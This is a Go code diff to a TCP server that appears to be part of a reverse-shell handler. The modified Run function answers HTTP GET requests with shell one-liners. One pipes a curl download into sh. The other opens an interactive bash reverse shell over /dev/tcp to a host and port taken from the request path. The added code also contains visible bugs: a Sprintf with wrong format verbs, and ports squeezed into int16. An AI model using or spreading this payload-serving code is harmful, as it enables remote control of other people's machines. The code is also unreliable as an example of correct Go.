@@ -33,6 +33,33 @@ func (s *TCPServer) Hash() string {
 	return hash.MD5(fmt.Sprintf("%s:%d:%s", s.Host, s.Port, s.TimeStamp))
 }
 
+func LeftStrip(data string) string {
+	var k int = 0
+	var v rune
+	for k, v = range data {
+		if v != '\x20' {
+			break
+		}
+	}
+	return data[k:]
+}
+
+func GetHostname(host string) string {
+	return strings.Split(host, ":")[0]
+}
+
+func GetPort(host string, default_port int16) int16 {
+	pair := strings.Split(host, ":")
+	if len(pair) < 2 {
+		return default_port
+	}
+	port, err := strconv.Atoi(pair[len(pair)-1])
+	if err != nil {
+		return default_port
+	}
+	return int16(port)
+}
+
 func (s *TCPServer) Run() {
 	service := fmt.Sprintf("%s:%d", s.Host, s.Port)
 	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
@@ -71,19 +98,36 @@ func (s *TCPServer) Run() {
 		}
 		if string(buffer[:n]) == "GET " {
 			requestURI := client.ReadUntilClean(" ")
+			// Read HTTP Version
+			client.ReadUntilClean("\r\n")
+			httpHost := fmt.Sprintf("%d:%n", s.Host, s.Port)
+			for {
+				var line = client.ReadUntilClean("\r\n")
+				// End of headers
+				if line == "" {
+					log.Debug("All header read")
+					break
+				}
+				delimiter := ":"
+				index := strings.Index(line, delimiter)
+				headerKey := line[:index]
+				headerValue := LeftStrip(line[index+len(delimiter):])
+				if headerKey == "Host" {
+					httpHost = headerValue
+				}
+			}
 			var command string = fmt.Sprintf(
-				"curl http://%s:%d/%s/%d|sh",
-				s.Host,
-				s.Port,
-				s.Host,
-				s.Port,
+				"curl http://%s/%s/%d|sh\n",
+				httpHost,
+				GetHostname(httpHost),
+				GetPort(httpHost, s.Port),
 			)
 			target := strings.Split(requestURI, "/")
 			if strings.HasPrefix(requestURI, "/") && len(target) == 3 {
 				host := target[1]
 				port, err := strconv.Atoi(target[2])
 				if err == nil {
-					command = fmt.Sprintf("bash -c 'bash -i >/dev/tcp/%s/%d 0>&1'", host, port)
+					command = fmt.Sprintf("bash -c 'bash -i >/dev/tcp/%s/%d 0>&1'\n", host, port)
 				} else {
 					log.Debug("Invalid port number: %s", target[2])
 				}
